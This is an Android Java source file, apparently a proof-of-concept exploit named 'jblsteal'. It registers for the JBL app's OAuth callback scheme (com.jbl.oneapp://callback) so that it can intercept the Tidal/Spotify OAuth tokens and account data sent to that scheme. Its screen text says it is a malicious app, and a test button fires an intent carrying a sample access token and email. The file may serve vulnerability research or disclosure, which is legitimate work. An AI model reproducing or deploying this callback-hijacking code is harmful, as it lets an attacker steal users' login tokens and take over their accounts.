package com.jblsteal;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TextView info = findViewById(R.id.info_text);
        Button testBtn = findViewById(R.id.test_btn);

        info.setText("Malicious app registered for:\ncom.jbl.oneapp://callback\n\n" +
                "Waiting for JBL OAuth callbacks...\n\n" +
                "When user logs into Tidal/Spotify via JBL app, this app will intercept all OAuth tokens and account data.");

        testBtn.setOnClickListener(v -> {
            // Test with sample OAuth data
            Intent testIntent = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("com.jbl.oneapp://callback?code=tidal_test_123&access_token=test_token&email=user@example.com"));
            startActivity(testIntent);
        });
    }
}